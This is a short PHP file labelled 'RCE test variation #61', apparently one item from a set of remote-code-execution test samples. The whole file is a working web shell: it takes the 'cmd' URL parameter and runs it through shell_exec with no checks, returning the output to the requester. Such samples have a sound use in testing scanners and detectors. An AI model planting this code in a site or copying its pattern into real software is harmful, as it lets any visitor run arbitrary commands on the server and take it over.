<?php
// RCE test variation #61
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>